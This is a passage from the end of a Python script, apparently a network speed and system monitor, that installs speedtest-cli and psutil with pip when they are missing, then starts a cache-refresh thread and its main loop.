            show_live_error(f"Main loop error: {str(e)[:30]}")

if __name__ == "__main__":
    try:
        # Install required packages if not present
        try:
            import speedtest
            import psutil
        except ImportError:
            print("📦 Installing required packages...")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "speedtest-cli", "psutil"])
            import speedtest
            import psutil
        
        # Start cache refresher thread
        threading.Thread(target=cache_refresher_loop, daemon=True).start()
        
        # Start main loop
        main_loop()
    except Exception as e:
        show_live_error(f"Fatal error: {str(e)}")